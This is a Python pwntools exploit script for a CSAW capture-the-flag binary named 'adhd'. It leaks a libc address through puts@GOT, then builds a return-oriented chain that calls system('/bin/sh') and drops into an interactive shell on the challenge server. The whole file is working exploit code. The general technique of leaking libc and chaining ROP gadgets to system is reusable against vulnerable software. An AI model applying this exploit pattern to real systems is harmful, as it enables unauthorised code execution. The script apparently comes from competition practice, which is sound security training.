#!/usr/bin/env python

from pwn import *

local = 0

if local:
	env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
	print "libc has been preloaded!", env
	r = process("./adhd", env=env)
	gdb.attach(r, '''
		set disable-randomization off
		b *0x4005f7	
		c
		''')
	# context.terminal = ["bash"] # required for WSL
else:
	r = remote("pwn.chal.csaw.io", 10102)

libc = ELF("./libc.so.6")

r.recvuntil("Give give:\n")

POP_RDI = 0x4006a3 # pop rdi; ret
PUTS_GOT = 0x600fd8 # puts@GOT
PUTS_MAIN = 0x4005f2

# leak libc by printing puts location
payload = ''
payload += p64(POP_RDI) 
payload += p64(PUTS_GOT) 
payload += p64(PUTS_MAIN) 

r.send(payload)


# get some useful info
puts_leak = u64(r.recvline().strip() + '\x00\x00')
libc_base = puts_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
one_gadget = libc_base + 0xf0274 # constraint: $rsp+0x50 is NULL
binsh =  libc_base + next(libc.search("/bin/sh\x00"))
found_string = libc_base + next(libc.search("empty == 1"))
log.info("libc base at 0x{:08x}".format(libc_base))
log.info("binsh at 0x{:08x}".format(binsh))
log.info("found string at 0x{:08x}".format(found_string))
log.info("offset: {:08x}".format(binsh - found_string))
xor_registers = 0x400616 # xor rcx, rdx, rsi; ret


# set up ropchain to return to system
payload = ''
payload += "stuff".ljust(16)
payload += p64(POP_RDI)
payload += p64(binsh-0x40)
payload += p64(system) #jumps to this location!
r.send(payload)

r.interactive()